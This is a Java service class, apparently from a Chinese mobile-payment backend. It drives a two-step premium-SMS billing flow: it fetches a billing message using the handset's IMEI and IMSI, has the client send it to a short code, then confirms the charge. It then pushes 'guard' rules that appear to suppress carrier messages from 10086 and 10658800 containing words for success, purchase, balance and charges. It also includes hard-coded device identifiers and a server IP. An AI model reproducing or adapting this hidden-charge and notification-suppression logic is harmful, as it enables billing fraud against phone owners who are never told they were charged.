package com.jxt.pay.appclient.service.dynamic.net;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;
import com.jxt.pay.appclient.utils.XmlUtils;

/**

说明:mm熟透的石榴强联网需要依次请求2个接口(url)完成计费.

第一步、请求接口1（http://122.114.52.197:8009/sms.aspx?imei=934364670888888&imsi=460005107888888）得到类似下面的短信内容，
MM#WLAN#G4Y/p48NOkLjTm+plGvYQQ==#424576095#399900002400，将得到的内容发送到10658424。

参数说明：
imei，手机的imei（取本机的）
imsi，sim卡的imsi（取本机的）
-------------------------------

第二步、取得第一步中得到的短信内容中的424576095，请求接口2（http://122.114.52.197:8009/synic.aspx?paycode=30000881835105&imei=934364670888888&imsi=460005107888888&channel=3003983022&pid=424576095）返回ok表示计费成功,返回其他为失败。

参数说明：
paycode，计费代码
imei，手机的imei（取本机的）
imsi，sim卡的imsi（取本机的）
channel，渠道号（固定值由我们分配3003983022）
pid，第一步中请求接口1得到的短信内容中两个#号之间的内容，如上面例子中的是424576095，这个值每次都不同。
 * @author leoliu
 *
 */
public class BjjsSmmDynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(BjjsSmmDynamicService.class);
	
	private static final String TYPE = "bjjsSmm";
	
	private static final String URLPARAM1 = "imsi={imsi}&imei={imei}";
	
	private static final String URLPARAM2 = "paycode={paycode}&imei={imei}&imsi={imsi}&channel={channelid}&pid={pid}";
	
	private static final String DEST = "10658424";
	
	private int timeOut = 60;
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String THENO_1 = "1";
	private static final String THENO_2 = "2";
	
	@Override
	public String getType() {
		return TYPE;
	}
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();

	@Override
	public String dynamic(Map<String, String> map) {
	
		String theNo = map.get("theNo");
		
		if(THENO_1.equals(theNo)){
			return firstDynamic(map);
		}else if(THENO_2.equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}
	
	private String firstDynamic(Map<String, String> map) {
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String orderId = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(orderId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(orderId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(orderId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			String param = URLPARAM1.replace("{imsi}", imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			param = param.replace("{imei}", imei);
			
			String responseXml = GetData.getData(url+"?"+param);
	
			xml = parseXml(map,responseXml);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(orderId);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String parseXml(Map<String, String> map,String xml){
		
		if(xml != null && xml.length() > 0){
			Sms sms = new Sms();
			
			String content = xml;
			
			sms.setSmsContent(content);
			sms.setSmsDest(DEST);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			String sid = fetchSid(content);
			
			
			Sets sets = new Sets();
			sets.setKey("sid");
			sets.setValue(sid);
			
			return XstreamHelper.toXml(sms).toString()+XstreamHelper.toXml(sets);
		}

		return null;
	}
	
	private Map<String, Long> tryMap1 = new HashMap<String, Long>();
	
	private String secondDynamic(Map<String, String> map){
		String xml = null;
		String url = map.get("url");
		
		String sid = map.get("sid");
		
		if(url != null && url.length() > 0){
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap1.get(sid);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap1.put(sid,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap1.remove(sid);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String paycode = map.get("paycode");
			String channelid = map.get("channelid");
			
			String param = URLPARAM2.replace("{imsi}", imsi).replace("{imei}", imei).replace("{paycode}",paycode).replace("{channelid}", channelid).replace("{pid}",sid);
			
			String responseXml = GetData.getData(url, param);
	
			xml = parseXml2(responseXml,map);
		}
		
		if(xml == null){
			xml = DynamicUtils.parseWait(10,map);
		}else{
			tryMap1.remove(sid);
		}
		
		return xml;
	}
	
	private String parseXml2(String responseXml,Map<String,String> map){
		
		if(responseXml != null && responseXml.length() > 0){
			
			if("ok".equals(responseXml)){
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
						
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				return XstreamHelper.toXml(guardSms).toString();
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return null;
	}
	
	private static String fetchSid(String content){
		
		if(content != null && content.length() > 0){
			int pos0 = content.lastIndexOf("#");
			
			String aa = content.substring(0,pos0);
			
			pos0 = aa.lastIndexOf("#");
			
			return aa.substring(pos0+1);
		}
		
		return null;
	}

	public static void main(String[] args){
		
		test2();
		
//		System.out.println(fetchSid("MM#WLAN#KjGDL0HmLvO27awoEZxqQw==#1022273555#399900003000"));
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://122.114.52.197:8003/sms.aspx");
		map.put("imei","862949029214504");
		map.put("imsi","460022101441340");
		map.put("channel","10B201a087654321");
		map.put("theNo", "1");
		map.put("type","bjjsSmm");
		
		System.out.println(new BjjsSmmDynamicService().dynamic(map));
	}
	
	private static void test2(){
//		http://pay.gzmtx.cn:8080/mm?appKey=B7AC82DB6B07FB1D3878E8DA68B8F736&imsi=460028174282753&imei=869460011612203&code=30000870542102&os=4.2.1&model=2013022&sid=294159264
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://122.114.52.197:8003/synic.aspx");
		map.put("imei","862949029214504");
		map.put("imsi","460022101441340");
		map.put("paycode","30000881831503");
		map.put("channelid","3003984439");
		map.put("sid","247685215");
		map.put("theNo", "2");
		map.put("type","bjjsSmm");
		
		System.out.println(new BjjsSmmDynamicService().dynamic(map));
	}
	
}
